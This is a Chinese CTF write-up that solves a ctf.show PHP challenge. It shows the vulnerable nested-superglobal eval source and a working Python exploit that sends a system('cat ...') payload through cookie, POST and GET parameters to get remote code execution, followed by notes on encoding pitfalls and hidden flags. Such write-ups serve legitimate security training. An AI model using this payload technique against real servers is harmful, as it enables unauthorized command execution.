【CTF-Show 嵌套eval的RCE】平台：ctf.show（challenge 动态靶机）｜难度：☆☆☆｜日期：2026-08-01

## 考点
嵌套超全局变量取参 + eval RCE（PHP 特性：表单嵌套数组、$_REQUEST 合并 GET/POST）

## 源码
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
```

## 我的思路
1. 页面直接 `highlight_file(__FILE__)` 给出源码 → 审计：唯一输入面是 eval 的嵌套取参链
2. 拆链：cookie 值 X → `$_POST[X]`=Y → `$_GET[Y]`=Z → `$_REQUEST[Z][6][0][7][5][8][0][9][4][4]` = 要 eval 的代码
3. 关键技巧：**PHP 表单支持嵌套数组**，POST 一个 `c[6][0][7][5][8][0][9][4][4]=代码` 正好填充整条下标链
4. 细节坑：cookie 名含中文"群"→ header 只能 latin-1 → 用原始 UTF-8 字节（E7 BE A4）发；冒号是**半角**（源码字节 3A 验证）
5. 打通链（echo 验证）→ ls 找 flag → `/f1agaaa`（l33t 拼写藏 flag）→ cat 拿 flag

## 解题过程
```python
# 核心 exploit（http.client 发原始 UTF-8 cookie 字节）
import http.client, ssl
from urllib.parse import quote
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
body = 'a=b&c[6][0][7][5][8][0][9][4][4]=' + quote("system('cat /f1agaaa');")
conn = http.client.HTTPSConnection(host, context=ctx)
conn.request('POST', '/?b=c', body=body, headers={
    'Cookie': b'CTFshow-QQ\xe7\xbe\xa4:=a',   # 群 = E7 BE A4
    'Content-Type': 'application/x-www-form-urlencoded',
})
```

链的组成：
```
Cookie:  CTFshow-QQ群:=a        # 值 a
POST:    a=b                    # a 作为 key → 得 b
GET:     b=c                    # b 作为 key → 得 c
POST:    c[6][0][7][5][8][0][9][4][4]=<PHP代码>   # c 的嵌套数组 → 下标链取值 → eval
```

flag：`ctfshow{94570b49-e110-4661-a172-b8f72eb82afd}`

## 收获
### 1. 嵌套超全局变量链的构造套路
- 多个超全局变量（$_COOKIE/$_POST/$_GET/$_REQUEST）互相做 key，本质是"参数名由上一层的参数值决定"
- 利用方式：逐层喂值（cookie 值=X → POST 里 X=Y → GET 里 Y=Z → 目标键=payload）
- **PHP 表单嵌套数组** `c[a][b]=x` 可以精确构造任意深度的数组下标

### 2. 关键坑（本题实测教训）
- **GET 带 body 不填充 $_POST**！必须用标准 POST 方法（实测：GET+body 链不生效）
- HTTP header 只能 latin-1：中文 cookie 名必须发 UTF-8 原始字节（Python http.client 直接传 bytes）
- 中文 cookie 名从源码**逐字节提取**（E7 BE A4 = 群），WP 手打版可能用全角冒号 → 以源码字节为准
- `error_reporting(0)`：eval 失败静默无输出 → 用 `echo 'EVALOK';` 这种标记 payload 验证链是否打通
- 靶机 SSL 证书不被信任 → verify=False / 跳过校验

### 3. 参考解答的批判性使用
- 对比 WP 与自己的解法：WP 里 `c[0]=1` 是多余的、payload 放 GET/POST 都行（$_REQUEST 合并）
- WP 看思路，细节必须自己实测

### 4. flag 藏匿套路
- 目录名 l33t 拼写伪装：`/f1agaaa` 代替 `/flag`
- 环境变量诱饵：`FLAG=not_flag`（明着骗）
- 找法：`ls /` + `env` 一起看，别只信一个位置

## 常见坑
- 中文 cookie 名在 Windows PowerShell 命令行会乱码 → 用 Python 脚本
- requests 库的 cookie jar 会重新编码 % → 手动传 Cookie 头或 http.client
